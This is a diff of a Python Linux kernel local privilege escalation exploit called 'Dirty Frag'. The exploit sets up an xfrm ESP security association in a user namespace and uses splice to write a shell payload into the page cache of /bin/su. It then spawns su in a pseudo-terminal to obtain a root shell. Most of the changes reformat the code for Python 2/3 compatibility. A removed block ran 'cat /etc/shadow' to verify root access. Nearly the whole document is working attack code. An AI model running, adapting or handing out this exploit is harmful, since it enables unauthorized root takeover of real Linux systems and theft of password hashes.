@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Dirty Frag — Linux Kernel LPE (xfrm-ESP Page-Cache Write)
-Modified: Targets /bin/su instead of /usr/bin/su
+Modified: Targets /bin/su with Python 2/3 compatibility
 """
 
 import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
@@ -25,7 +25,8 @@ def _raw_splice(fd_in, off_in, fd_out, off_out, length, flags):
     return r
 
 SYS_unshare = 272
-CLONE_NEWUSER = 0x10000000; CLONE_NEWNET = 0x40000000
+CLONE_NEWUSER = 0x10000000
+CLONE_NEWNET = 0x40000000
 
 def _syscall(nr, *args):
     _libc.syscall.restype = ctypes.c_long
@@ -39,18 +40,30 @@ def _syscall(nr, *args):
 def sys_unshare(flags):
     return _syscall(SYS_unshare, flags)
 
-AF_NETLINK=16; AF_INET=2
+AF_NETLINK=16
+AF_INET=2
 SOCK_DGRAM=2
-IPPROTO_UDP=17; NETLINK_XFRM=6
-UDP_ENCAP=100; UDP_ENCAP_ESPINUDP=2
-XFRM_MSG_NEWSA=16; NLM_F_REQUEST=1; NLM_F_ACK=4
-IPPROTO_ESP=50; XFRM_MODE_TRANSPORT=0; XFRM_STATE_ESN=0x80
-XFRMA_ALG_AUTH_TRUNC=20; XFRMA_ALG_CRYPT=2
-XFRMA_ENCAP=4; XFRMA_REPLAY_ESN_VAL=23
-ENC_PORT=4500; SEQ_VAL=200; REPLAY_SEQ=100
-# CHANGE: Target /bin/su instead
+IPPROTO_UDP=17
+NETLINK_XFRM=6
+UDP_ENCAP=100
+UDP_ENCAP_ESPINUDP=2
+XFRM_MSG_NEWSA=16
+NLM_F_REQUEST=1
+NLM_F_ACK=4
+IPPROTO_ESP=50
+XFRM_MODE_TRANSPORT=0
+XFRM_STATE_ESN=0x80
+XFRMA_ALG_AUTH_TRUNC=20
+XFRMA_ALG_CRYPT=2
+XFRMA_ENCAP=4
+XFRMA_REPLAY_ESN_VAL=23
+ENC_PORT=4500
+SEQ_VAL=200
+REPLAY_SEQ=100
 TARGET_SU = "/bin/su"
-PATCH_OFFSET = 0; PAYLOAD_LEN = 192; ENTRY_OFFSET = 0x78
+PATCH_OFFSET = 0
+PAYLOAD_LEN = 192
+ENTRY_OFFSET = 0x78
 SPLICE_F_MOVE=1
 
 SHELL_ELF = bytes([
@@ -72,10 +85,18 @@ SU_MARKER = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])
 
 VERBOSE = bool(os.getenv("DIRTYFRAG_VERBOSE"))
 
-def LOG(fmt, *a): print("[+] " + fmt % a, file=sys.stderr)
-def WARN(fmt, *a): print("[!] " + fmt % a, file=sys.stderr)
+def LOG(fmt, *a):
+    sys.stderr.write("[+] " + (fmt % a) + "\n")
+    sys.stderr.flush()
+
+def WARN(fmt, *a):
+    sys.stderr.write("[!] " + (fmt % a) + "\n")
+    sys.stderr.flush()
+
 def DBG(fmt, *a):
-    if VERBOSE: print("[.] " + fmt % a, file=sys.stderr)
+    if VERBOSE:
+        sys.stderr.write("[.] " + (fmt % a) + "\n")
+        sys.stderr.flush()
 
 def _ifup_lo():
     s = socket.socket(AF_INET, SOCK_DGRAM, 0)
@@ -91,9 +112,12 @@ def _ifup_lo():
 def _setup_userns():
     uid, gid = os.getuid(), os.getgid()
     sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
-    with open("/proc/self/setgroups", 'w') as f: f.write("deny")
-    with open("/proc/self/uid_map", 'w') as f: f.write(f"0 {uid} 1")
-    with open("/proc/self/gid_map", 'w') as f: f.write(f"0 {gid} 1")
+    with open("/proc/self/setgroups", 'w') as f:
+        f.write("deny")
+    with open("/proc/self/uid_map", 'w') as f:
+        f.write("0 {} 1".format(uid))
+    with open("/proc/self/gid_map", 'w') as f:
+        f.write("0 {} 1".format(gid))
     _ifup_lo()
 
 def _nl_attr(buf, off, atype, data):
@@ -141,14 +165,16 @@ def _add_xfrm_sa(spi, seqhi):
     aa[:len(n)] = n
     struct.pack_into('<I', aa, 64, 256)
     struct.pack_into('<I', aa, 68, 128)
-    for i in range(32): aa[72+i] = 0xAA
+    for i in range(32):
+        aa[72+i] = 0xAA
     a = _nl_attr(buf, a, XFRMA_ALG_AUTH_TRUNC, bytes(aa))
 
     ea = bytearray(68 + 16)
     n2 = b"cbc(aes)\0"
     ea[:len(n2)] = n2
     struct.pack_into('<I', ea, 64, 128)
-    for i in range(16): ea[68+i] = 0xBB
+    for i in range(16):
+        ea[68+i] = 0xBB
     a = _nl_attr(buf, a, XFRMA_ALG_CRYPT, bytes(ea))
 
     enc = bytearray(24)
@@ -180,14 +206,13 @@ def _do_write(path, offset, spi):
     sk_s = socket.socket(AF_INET, SOCK_DGRAM, 0)
     sk_s.connect(("127.0.0.1", ENC_PORT))
     
-    # Try to open with O_RDONLY
     try:
         fd = os.open(path, os.O_RDONLY)
     except PermissionError:
-        WARN("Cannot open %s for reading - try running 'cat %s > /dev/null' first as a user with read permissions", path, path)
+        WARN("Cannot open %s for reading", path)
         return False
-    except FileNotFoundError:
-        WARN("Target %s not found", path)
+    except OSError as e:
+        WARN("Cannot open %s: %s", path, str(e))
         return False
     
     r, w = os.pipe()
@@ -199,7 +224,11 @@ def _do_write(path, offset, spi):
     except OSError:
         pass
     time.sleep(0.15)
-    os.close(fd); os.close(r); os.close(w); sk_s.close(); sk_r.close()
+    os.close(fd)
+    os.close(r)
+    os.close(w)
+    sk_s.close()
+    sk_r.close()
     return True
 
 def _corrupt_su():
@@ -221,14 +250,18 @@ def _corrupt_su():
 def su_lpe_main():
     pid = os.fork()
     if pid == 0:
-        os._exit(0 if _corrupt_su() else 2)
+        result = 0 if _corrupt_su() else 2
+        os._exit(result)
     _, st = os.waitpid(pid, 0)
     if os.WEXITSTATUS(st) != 0:
         return False
-    fd = os.open(TARGET_SU, os.O_RDONLY)
-    got = os.pread(fd, 2, ENTRY_OFFSET)
-    os.close(fd)
-    return got == bytes([0x31, 0xFF])
+    try:
+        fd = os.open(TARGET_SU, os.O_RDONLY)
+        got = os.pread(fd, 2, ENTRY_OFFSET)
+        os.close(fd)
+        return got == bytes([0x31, 0xFF])
+    except:
+        return False
 
 def _su_patched():
     try:
@@ -258,16 +291,16 @@ def _run_pty():
                 fcntl.ioctl(sf, termios.TIOCSCTTY, 0)
             except OSError:
                 pass
-            os.dup2(sf, 0); os.dup2(sf, 1); os.dup2(sf, 2)
+            os.dup2(sf, 0)
+            os.dup2(sf, 1)
+            os.dup2(sf, 2)
             if sf > 2:
                 os.close(sf)
-            # Try multiple su locations
             for p in ("/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su"):
                 try:
                     os.execv(p, ["su", "-"])
-                except (FileNotFoundError, PermissionError):
+                except (FileNotFoundError, OSError):
                     continue
-            # Fallback to sh
             os.execvp("sh", ["sh"])
             os._exit(127)
 
@@ -290,8 +323,6 @@ def _run_pty():
         eof = False
         saw = False
         tms = 0
-        auto_v = os.getenv("LPE_AUTO_VERIFY") == '1'
-        v_sent = False
 
         while True:
             fds = []
@@ -303,12 +334,12 @@ def _run_pty():
             fds.append(master)
 
             try:
-                r, _, _ = select.select(fds, [], [], 0.2)
+                rlist, _, _ = select.select(fds, [], [], 0.2)
             except (OSError, ValueError):
                 break
             tms += 200
 
-            if master in r:
+            if master in rlist:
                 try:
                     data = os.read(master, 4096)
                 except OSError:
@@ -322,7 +353,7 @@ def _run_pty():
                         os.write(master, b'\n')
                         pw_sent = True
 
-            if not eof and sys.stdin.fileno() in r:
+            if not eof and sys.stdin.fileno() in rlist:
                 try:
                     data = os.read(sys.stdin.fileno(), 4096)
                 except OSError:
@@ -337,17 +368,13 @@ def _run_pty():
                 os.write(master, b'\n')
                 pw_sent = True
 
-            if auto_v and not v_sent and tms >= 1000:
-                os.write(master, b"id; whoami; cat /etc/shadow | head -2; exit\n")
-                v_sent = True
-
             try:
                 wp, st = os.waitpid(pid, os.WNOHANG)
                 if wp == pid:
                     for _ in range(5):
                         try:
-                            r2, _, _ = select.select([master], [], [], 0.05)
-                            if not r2:
+                            rlist2, _, _ = select.select([master], [], [], 0.05)
+                            if not rlist2:
                                 break
                             d = os.read(master, 4096)
                             if not d:
@@ -363,7 +390,7 @@ def _run_pty():
             termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, saved)
         os.close(master)
     except Exception as e:
-        WARN("PTY: %s", e)
+        WARN("PTY: %s", str(e))
         return False
     return True
 
@@ -380,7 +407,6 @@ def main():
 
     LOG("running ESP variant against %s ...", TARGET_SU)
     
-    # Check if target exists and is readable
     if not os.path.exists(TARGET_SU):
         WARN("Target %s does not exist!", TARGET_SU)
         sys.exit(1)
@@ -388,11 +414,11 @@ def main():
     # Try to read the file to get it into page cache
     try:
         with open(TARGET_SU, 'rb') as f:
-            f.read(4096)  # Force into page cache
+            f.read(4096)
         LOG("Successfully read %s into page cache", TARGET_SU)
-    except PermissionError:
-        WARN("Cannot read %s - you need read permission for the exploit to work", TARGET_SU)
-        WARN("Try: sudo chmod o+r %s  (if you have sudo access)", TARGET_SU)
+    except IOError as e:
+        WARN("Cannot read %s: %s", TARGET_SU, str(e))
+        WARN("You need read permission for the exploit to work")
         sys.exit(1)
     
     su_lpe_main()
